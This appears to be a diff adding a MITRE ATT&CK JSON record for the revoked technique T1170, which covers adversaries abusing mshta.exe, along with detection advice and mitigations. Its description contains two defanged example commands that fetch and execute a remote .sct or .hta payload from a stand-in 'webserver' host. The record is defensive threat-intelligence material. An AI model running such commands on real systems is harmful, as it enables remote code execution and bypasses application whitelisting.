@@ -1,0 +1,122 @@
+﻿{
+    "id": "T1170",
+    "name": "Mshta",
+    "x_mitre_is_subtechnique": false,
+    "revoked": true,
+    "x_mitre_deprecated": false,
+    "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nAdversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+    "x_mitre_platforms": [
+        "Windows"
+    ],
+    "x_mitre_domains": [
+        "enterprise-attack"
+    ],
+    "x_mitre_defense_bypassed": [
+        "Application whitelisting",
+        "Digital Certificate Validation"
+    ],
+    "external_references": [
+        {
+            "source_name": "mitre-attack",
+            "url": "https://attack.mitre.org/techniques/T1170",
+            "external_id": "T1170"
+        },
+        {
+            "source_name": "Wikipedia HTML Application",
+            "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
+            "url": "https://en.wikipedia.org/wiki/HTML_Application"
+        },
+        {
+            "source_name": "MSDN HTML Applications",
+            "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
+            "url": "https://msdn.microsoft.com/library/ms536471.aspx"
+        },
+        {
+            "source_name": "Cylance Dust Storm",
+            "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.",
+            "url": "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf"
+        },
+        {
+            "source_name": "Red Canary HTA Abuse Part Deux",
+            "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
+            "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/"
+        },
+        {
+            "source_name": "FireEye Attacks Leveraging HTA",
+            "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
+            "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html"
+        },
+        {
+            "source_name": "Airbus Security Kovter Analysis",
+            "description": "Dove, A. (2016, March 23). Fileless Malware \u2013 A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
+            "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/"
+        },
+        {
+            "source_name": "FireEye FIN7 April 2017",
+            "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+            "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+        },
+        {
+            "source_name": "LOLBAS Mshta",
+            "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+        }
+    ],
+    "kill_chain_phases": [
+        {
+            "kill_chain_name": "mitre-attack",
+            "phase_name": "defense-evasion"
+        },
+        {
+            "kill_chain_name": "mitre-attack",
+            "phase_name": "execution"
+        }
+    ],
+    "tactic": [
+        "defense-evasion",
+        "execution"
+    ],
+    "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.",
+    "x_mitre_data_sources": [],
+    "x_mitre_permissions_required": [
+        "User"
+    ],
+    "x_mitre_effective_permissions": [],
+    "x_mitre_system_requirements": [],
+    "x_mitre_remote_support": false,
+    "relation": {
+        "mitigates": [
+            {
+                "name": "Execution Prevention",
+                "description": "Block execution of code on a system through application control, and/or script blocking.",
+                "type": "course-of-action",
+                "id": "M1038"
+            },
+            {
+                "name": "Mshta Mitigation",
+                "description": "Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life. Use application whitelisting configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries.",
+                "type": "course-of-action",
+                "id": "T1170"
+            },
+            {
+                "name": "Disable or Remove Feature or Program",
+                "description": "Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.",
+                "type": "course-of-action",
+                "id": "M1042"
+            }
+        ]
+    },
+    "mitigationRequirements": {
+        "requirements": []
+    },
+    "detectionRequirements": {
+        "requirements": []
+    },
+    "cspcontrolIds": [],
+    "externalcontrolIds": [],
+    "peoplecontrolIds": [],
+    "policycontrolIds": [],
+    "technologycontrolIds": [],
+    "cveIds": [],
+    "subTechniques": []
+}
